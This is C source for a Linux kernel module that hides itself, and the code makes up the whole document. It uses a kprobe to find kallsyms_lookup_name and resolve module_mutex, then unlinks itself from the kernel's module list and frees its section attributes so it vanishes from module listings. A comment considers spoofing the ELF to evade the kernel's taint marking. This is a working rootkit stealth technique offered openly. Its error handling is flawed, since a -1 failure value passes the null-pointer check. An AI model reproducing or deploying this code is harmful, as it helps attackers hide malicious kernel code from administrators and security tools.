#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/slab.h>

#define MOD_SUCCESS 0
#define MOD_FAIL -1

static bool hidden = false;
static struct mutex *mod_mutex;
struct list_head *other_modules;

typedef unsigned long (*pt_kallsyms_lookup_name)(const char *);

unsigned long find_ksymbol(const char *name) {
#ifdef CONFIG_KPROBES
	struct kprobe probe;
	memset(&probe, 0, sizeof(probe));
	probe.symbol_name = "kallsyms_lookup_name";

	if (register_kprobe(&probe) != MOD_SUCCESS) {
		printk(KERN_ERR "Registering kallsyms probe failed.");
		return MOD_FAIL;
	}

	pt_kallsyms_lookup_name lookup;
	lookup = (pt_kallsyms_lookup_name) probe.addr;
	unregister_kprobe(&probe);

	// kallsyms_lookup_name returns 0 when not found
	return lookup(name);
#endif
	return MOD_FAIL;
}

static int reveal_self(void) {
	if (!hidden) {
		printk(KERN_NOTICE "Module is not hidden.\n");
		return MOD_FAIL;
	}

	while (!mutex_trylock(mod_mutex)) {
		cpu_relax();
	}
	list_add(&THIS_MODULE->list, other_modules);

	mutex_unlock(mod_mutex);
	hidden = false;

	printk(KERN_NOTICE "Module revealed.\n");
	return MOD_SUCCESS;
}

static int hide_self(void) {
	mod_mutex = (struct mutex *) find_ksymbol("module_mutex");

	if (!mod_mutex) {
		printk(KERN_NOTICE "Couldn't find mutex.");
		return MOD_FAIL;
	}
	printk(KERN_NOTICE "Dumped mutex addr: %lu\n.",
			(unsigned long) mod_mutex);

	while (!mutex_trylock(mod_mutex)) {
		cpu_relax();
	}

	other_modules = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list); 

	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(mod_mutex);

	hidden = true;
	printk(KERN_NOTICE "Module hidden.\n");
	return MOD_SUCCESS;
}

/*
 * Not sure to what extent this can be handled, but currently
 * upon loading we hit some code in module/main.c that
 * marks this module tainted/out of tree. It looks like it
 * checks the elf... I wonder if there is a way to spoof
 * the elf that this module will use.
 * 
 * static void handle_taint_flags(void) {}
 */ 

static int __init startup(void) {
	if (hide_self() == 0) {}
	if (reveal_self() == 0) {}
	return MOD_SUCCESS;
}

static void __exit shutdown(void) {
	printk(KERN_NOTICE "Closing...\n");
}

module_init(startup);
module_exit(shutdown);
MODULE_LICENSE("GPL");
